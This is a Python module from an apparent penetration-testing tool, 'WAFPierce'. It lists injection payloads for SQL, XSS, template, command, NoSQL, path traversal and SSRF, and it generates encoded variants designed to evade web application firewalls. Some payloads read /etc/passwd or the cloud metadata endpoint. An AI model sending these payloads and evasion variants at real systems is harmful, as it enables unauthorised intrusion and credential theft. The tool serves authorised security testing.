"""
WAFPierce Payload Mutation Engine + Packs

A deterministic (no-AI, no-network) evasion-variant generator plus curated
payload packs. Used by the injection tests and the parameter fuzzer to widen
coverage without requiring an API key. The AI mutation path (ai_triage.py) is a
separate, optional enhancement.
"""
import re
import urllib.parse
from typing import List, Dict

# ---------------------------------------------------------------- payload packs
PAYLOAD_PACKS: Dict[str, List[str]] = {
    'sqli': [
        "' OR '1'='1", "' OR 1=1-- -", "1' AND '1'='1", "' UNION SELECT NULL-- -",
        "admin'-- -", "' OR SLEEP(0)-- -", "1) OR (1=1", "' OR 'x'='x",
        "'/**/OR/**/1=1-- -", "1'%0aOR%0a'1'='1", "0x270x6f0x72",
        "' OR 1=1 LIMIT 1-- -", "\" OR \"\"=\"", "') OR ('1'='1",
    ],
    'xss': [
        "<script>alert(1)</script>", "<svg/onload=alert(1)>",
        "\"><img src=x onerror=alert(1)>", "'><svg onload=alert(1)>",
        "<body onload=alert(1)>", "javascript:alert(1)",
        "<iframe src=javascript:alert(1)>", "<details open ontoggle=alert(1)>",
        "<scr<script>ipt>alert(1)</scr</script>ipt>", "<img src=x oneonerrorrror=alert(1)>",
    ],
    'ssti': [
        "{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>", "{{7*'7'}}",
        "${{7*7}}", "#{ 7*7 }", "{{config}}", "{{''.__class__.__mro__}}",
        "*{7*7}", "@(7*7)", "{php}echo 7*7;{/php}",
    ],
    'cmd': [
        ";id", "|id", "`id`", "$(id)", ";id||", "%0aid", "&&id",
        ";cat${IFS}/etc/passwd", "|whoami", "$(uname -a)", ";ping -c1 127.0.0.1",
    ],
    'path_traversal': [
        "../../../etc/passwd", "..%2f..%2f..%2fetc/passwd",
        "%2e%2e%2f%2e%2e%2fetc/passwd", "....//....//etc/passwd",
        "..%c0%af..%c0%afetc/passwd", "/etc/passwd%00",
        "..\\..\\..\\windows\\win.ini", "..%5c..%5cwindows%5cwin.ini",
    ],
    'nosql': [
        '{"$gt":""}', '{"$ne":null}', '{"$where":"1==1"}', "[$ne]=1",
        '{"$regex":".*"}', "';return true;var x='",
    ],
    'ssrf': [
        "http://127.0.0.1", "http://localhost", "http://[::1]",
        "http://2130706433", "http://0177.0.0.1", "http://0x7f.0.0.1",
        "http://169.254.169.254/latest/meta-data/",
    ],
}

# ---------------------------------------------------------------- mutators
_SQL_KEYWORDS = re.compile(r'\b(SELECT|UNION|OR|AND|WHERE|FROM|SLEEP|NULL)\b', re.IGNORECASE)


def _case_swap(p: str) -> str:
    return ''.join(c.upper() if i % 2 else c.lower() for i, c in enumerate(p))


def _sql_comment_break(p: str) -> str:
    return _SQL_KEYWORDS.sub(lambda m: m.group(0)[0] + '/**/' + m.group(0)[1:], p)


def _double_url_encode(p: str) -> str:
    return urllib.parse.quote(urllib.parse.quote(p, safe=''), safe='')


def _url_encode(p: str) -> str:
    return urllib.parse.quote(p, safe='')


def _ws_to_alt(p: str) -> str:
    # Replace spaces with WAF-tricky whitespace equivalents.
    return p.replace(' ', '/**/') if "'" in p or _SQL_KEYWORDS.search(p) else p.replace(' ', '%09')


def _unicode_fullwidth(p: str) -> str:
    out = []
    for c in p:
        if 'a' <= c <= 'z' or 'A' <= c <= 'Z':
            out.append(chr(ord(c) + 0xFEE0))  # fullwidth form
        else:
            out.append(c)
    return ''.join(out)


def _null_inject(p: str) -> str:
    return p.replace('<', '<\x00').replace('=', '=\x00') if '<' in p or '=' in p else p + '%00'


def _comment_insert_html(p: str) -> str:
    return p.replace('script', 'scr<!---->ipt') if 'script' in p.lower() else p


_MUTATORS = [
    _case_swap, _sql_comment_break, _url_encode, _double_url_encode,
    _ws_to_alt, _unicode_fullwidth, _comment_insert_html,
]


def mutate(payload: str, max_variants: int = 8) -> List[str]:
    """Return deterministic evasion variants of a payload (incl. the original)."""
    seen = [payload]
    for m in _MUTATORS:
        try:
            v = m(payload)
        except Exception:
            continue
        if v and v not in seen:
            seen.append(v)
        if len(seen) >= max_variants:
            break
    return seen[:max_variants]


def expand_pack(category: str, extra: List[str] = None, mutate_each: bool = True,
                max_per_seed: int = 4, cap: int = 60) -> List[str]:
    """Build a fuzzing list for a category: pack payloads (+ extras), optionally
    each mutated into a few evasion variants, de-duplicated and capped."""
    seeds = list(PAYLOAD_PACKS.get(category, []))
    if extra:
        seeds.extend(extra)
    out = []
    for s in seeds:
        if mutate_each:
            out.extend(mutate(s, max_variants=max_per_seed))
        else:
            out.append(s)
    # de-dupe preserving order
    deduped = list(dict.fromkeys(out))
    return deduped[:cap]
